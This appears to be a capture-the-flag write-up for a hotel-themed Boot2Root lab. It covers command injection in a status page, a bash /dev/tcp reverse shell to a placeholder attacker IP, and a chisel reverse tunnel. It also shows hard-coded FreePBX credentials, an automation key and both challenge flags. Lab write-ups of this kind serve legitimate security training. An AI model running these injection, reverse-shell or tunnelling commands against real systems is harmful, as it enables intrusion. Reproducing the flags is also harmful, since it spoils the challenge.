Infinity Pool is a medium-difficulty Boot2Root challenge featured in Act 3 of the Hacker Holidays series. Set within the Byte Lotus Hotel environment, the premise takes us beyond the visible web interface to explore hidden, undocumented systems running on the internal network. Success requires identifying exposed entry points, exploiting web vulnerabilities to establish initial access, and navigating local misconfigurations to elevate privileges to root.
after nmap we found :
![](Pasted%20image%2020260806234357.png)
ssh and http is open let's open website :
![](Pasted%20image%2020260806234424.png)
not found anything let's do fuzz :
![](Pasted%20image%2020260806234454.png)
and here we go after fuzz we found robots.txt lets open
![](Pasted%20image%2020260806234517.png)
now open /status to see what is there
![](Pasted%20image%2020260806234541.png)
hmmmm input field, let's test :

```
127.0.0.1; id
```

![](Pasted%20image%2020260806234638.png)
and it's work let's RCE

```
nc -lvnp 4444
```

and insert in input

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

![](Pasted%20image%2020260806234924.png)
and here we go we got first flag ( user )
![](Pasted%20image%2020260806235009.png)

**user Flag : THM{n0_v1s1bl3_3dg3}**

Looked at the app's neighbours:
![](Pasted%20image%2020260806235112.png)
Three services: `edge` (the web app, us), `watchtower` (owned by `svc-watch`), and `automation` (owned by `root`) - the last two unreadable. `ps aux` filled in the picture:
watchtower - gunicorn on `127.0.0.1:3000`, running as `svc-watch`
automation - gunicorn on `127.0.0.1:9000`, running as `root`
Both loopback-only, so invisible from outside - but I am inside now, so I can reach them.
Watchtower leaks the creds
![](Pasted%20image%2020260806235212.png)
![](Pasted%20image%2020260806235238.png)
`127.0.0.1:8080/ucp` was FreePBX 16.0.45. The username `FreePBXUCPTemplateCreator` is the tell for CVE-2026-46376 - hard-coded credentials baked into the UCP generic template that let you log straight into the User Control Panel.
Logging in with raw curl kept bouncing back to the login page (the login runs through JavaScript/AJAX, which curl can't drive). So I tunnelled the internal ports out with chisel and used a real browser.
Attacker box:

```
./chisel server -p 9999 --reverse
```

Target (pulled chisel over from a python http.server on my box):

```
./chisel client <ATTACKER-IP>:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
```

Then browsed to `http://127.0.0.1:8080/ucp/` and logged in with the leaked creds. The JS runs in a browser, so the login stuck.
![](Pasted%20image%2020260807000402.png)
now open `http://127.0.0.1:8080/ucp/`
![](Pasted%20image%2020260807000737.png)
Username: `FreePBXUCPTemplateCreator`
Password: `St4yN0t1c3d_2026`
after add dashboard with any name ( main )
![](Pasted%20image%2020260807001534.png)
![](Pasted%20image%2020260807001548.png)
and now we have key :

```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

![](Pasted%20image%2020260807002105.png)

root flag : THM{tr4c3d_t0_th3_h0r1z0n}
